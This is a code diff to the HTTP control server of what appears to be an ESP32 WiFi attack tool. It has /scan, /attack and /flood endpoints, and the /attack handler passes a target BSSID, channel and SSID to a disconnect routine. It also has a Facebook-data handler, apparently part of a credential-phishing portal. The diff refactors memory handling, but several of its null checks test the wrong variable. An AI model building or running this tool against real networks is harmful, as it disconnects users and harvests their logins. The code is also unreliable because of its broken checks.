@@ -8,64 +8,70 @@
 #include "tasks.h"
 #include "facebook_web_server.h"
 
-//                                   SSID + BSSID + json formating
-#define JSON_BUFFER_SIZE (MAX_APS * (32 + 17 + 31))
- wifictl_ap_records_t ap_records = {0};
+#define MAIN_WEBSERVER_BUFFER_SIZE 1024 * 8
+uint8_t main_webserver_buffer[MAIN_WEBSERVER_BUFFER_SIZE];
 
-void handle_scan(int client_sock) {
-    int err = scan_networks(&ap_records);
-    if (err != 0) {
+void handle_scan(allocator_t* allocator, int client_sock) {
+    AP_records_t* records = scan_networks(allocator, 10);
+    if (records == 0) {
         ESP_LOGE("WebServer", "Failed to scan networks");
         http_send_error_response(client_sock);
         return;
     }
-    char json[JSON_BUFFER_SIZE] = {0};
-    int records_parsed = records_to_json(&ap_records, json, JSON_BUFFER_SIZE);
-    if(records_parsed != 0) {
+    char* json = records_to_json(allocator, records);
+    if(json == NULL) {
         ESP_LOGE("WebServer", "Failed to convert records to JSON");
         http_send_error_response(client_sock);
         return;
     }
+    printf("JSON to send: %s \n", json);
     http_send_json_response(client_sock, json);
+    allocator_free_n(allocator, 2);
 }
 
-void handle_attack(http_request_t* req, int client_sock) {
-    char bssid[18];
-    int ret = http_request_get_url_param(req->url, "bssid", sizeof(bssid), bssid);
-    if (ret != 0) {
+void handle_attack(allocator_t* allocator, http_request_t* req, int client_sock) {
+    char* bssid = http_request_get_url_param(allocator, req->url, "bssid");
+    if (bssid == NULL) {
         ESP_LOGE("WebServer", "Failed to get BSSID from URL");
         http_send_bad_request_response(client_sock);
         return;
     }
-    char timeout_str[6];
-    ret = http_request_get_url_param(req->url, "timeout", sizeof(timeout_str), timeout_str);
-    if (ret != 0) {
+    char* timeout_str = http_request_get_url_param(allocator, req->url, "timeout");
+    if (timeout_str == NULL) {
         ESP_LOGE("WebServer", "Failed to get timeout from URL");
         http_send_bad_request_response(client_sock);
         return;
     }
-    int timeout = atoi(timeout_str);
-    uint8_t bytes_bssid[6];
-    ret = bssid_string_to_bytes(bssid, bytes_bssid);
-    if(ret != 0) {
+    char* channel_str = http_request_get_url_param(allocator, req->url, "channel");
+    if (timeout_str == NULL) {
+        ESP_LOGE("WebServer", "Failed to get channel from URL");
+        http_send_bad_request_response(client_sock);
+        return;
+    }
+    char* authmode_str = http_request_get_url_param(allocator, req->url, "authmode");
+    if (timeout_str == NULL) {
+        ESP_LOGE("WebServer", "Failed to get authmode from URL");
+        http_send_bad_request_response(client_sock);
+        return;
+    }
+    char* ssid = http_request_get_url_param(allocator, req->url, "ssid");
+    if (timeout_str == NULL) {
+        ESP_LOGE("WebServer", "Failed to get ssid from URL");
+        http_send_bad_request_response(client_sock);
+        return;
+    }
+    uint8_t* bytes_bssid = bssid_string_to_bytes(allocator, bssid);
+    if(bytes_bssid == NULL) {
         ESP_LOGE("WebServer", "Failed to convert BSSID string to bytes");
         http_send_error_response(client_sock);
         return;
     }
-    wifi_ap_record_t* record = get_ap_record_by_bssid(&ap_records, bytes_bssid);
-    if(record == NULL)
-    {
-        ESP_LOGE("WebServer", "BSSID not found");
-        http_send_bad_request_response(client_sock);
-        return;
-    }
     http_send_ok_response(client_sock);
-    ret = wifi_disconnect(record, timeout);
-    if (ret != ESP_OK) {
-        ESP_LOGE("WebServer", "BSSID not found");
-        http_send_error_response(client_sock);
-        return;
-    }
+
+    int seconds = atoi(timeout_str);
+    uint8_t channel = atoi(channel_str);
+    wifi_auth_mode_t authmode = atoi(authmode_str);
+    wifi_disconnect(bytes_bssid, ssid, channel, authmode, seconds);
 }
 
 void handle_flood(http_request_t* req, int client_sock) {
@@ -106,7 +112,7 @@ void handle_facebook_data(http_request_t* req, int client_sock) {
     http_send_json_response(client_sock, json);
 }
 
-void handle_connection(http_request_t* req, int client_sock) {
+void handle_connection(allocator_t* allocator, http_request_t* req, int client_sock) {
     if(strcmp(req->method, "POST") == 0) {
         ESP_LOGI("WebServer", "Handling POST request");
         http_send_not_found_response(client_sock);
@@ -119,10 +125,10 @@ void handle_connection(http_request_t* req, int client_sock) {
         http_send_html_response(client_sock, root_page_html);
     } else if (strcmp(req->url, "/scan") == 0) {
         ESP_LOGI("WebServer", "Handling scan request");
-        handle_scan(client_sock);
+        handle_scan(allocator, client_sock);
     } else if(strncmp(req->url, "/attack", 7) == 0) {
         ESP_LOGI("WebServer", "Handling attack request");
-        handle_attack(req, client_sock);
+        handle_attack(allocator, req, client_sock);
     } else if (strcmp(req->url, "/flood") == 0) {
         ESP_LOGI("WebServer", "Handling flood request");
         handle_flood(req, client_sock);
@@ -142,6 +148,9 @@ void handle_connection(http_request_t* req, int client_sock) {
 }
 
 void start_webserver(){
+    allocator_t allocator;
+    allocator_init(&allocator, main_webserver_buffer, MAIN_WEBSERVER_BUFFER_SIZE);
+
     ESP_LOGI("WebServer", "Creating socket...");
     int sock = socket_create(IPv4, Stream);
     if (sock < 0) {
@@ -166,6 +175,8 @@ void start_webserver(){
     ESP_LOGI("WebServer", "Web server started on port 80");
 
     while (1) {
+        allocator_reset(&allocator);
+
         int client_sock = socket_accept(sock);
         if (client_sock < 0) {
             ESP_LOGE("WebServer", "Failed to accept connection");
@@ -173,21 +184,34 @@ void start_webserver(){
         }
         ESP_LOGI("WebServer", "Connection accepted...");
 
-        char buffer[1024];
-        int len = socket_receive(client_sock, (unsigned char*)buffer, sizeof(buffer) - 1);
+        char* buffer = allocator_alloc_type(&allocator, char, 1024);
+        if (buffer == NULL) {
+            ESP_LOGE("WebServer", "Failed to allocate memory for request");
+            close(client_sock);
+            continue;
+        }
+
+        ESP_LOGI("WebServer", "Reading request...");
+        int len = socket_receive(client_sock, buffer, 1023);
         if (len < 0) {
             ESP_LOGE("WebServer", "Failed to receive data");
             close(client_sock);
             continue;
         }
         buffer[len] = 0;
-        
-        http_request_t req = http_request_parse(buffer);
-        printf("Request Method: %s\n", req.method);
-        printf("Request URL: %s\n", req.url);
+        allocator_realloc_type(&allocator, char, len+1);
 
-        handle_connection(&req, client_sock);
-        free_http_request(&req);
+        ESP_LOGI("WebServer", "Parsing request...");
+        http_request_t* req = http_request_parse(&allocator, buffer);
+        if(req == NULL){
+            ESP_LOGE("WebServer", "Failed to parse data");
+            close(client_sock);
+            continue;
+        }
+        printf("Request Method: %s\n", req->method);
+        printf("Request URL: %s\n", req->url);
+
+        handle_connection(&allocator, req, client_sock);
         close(client_sock);
     }
 }
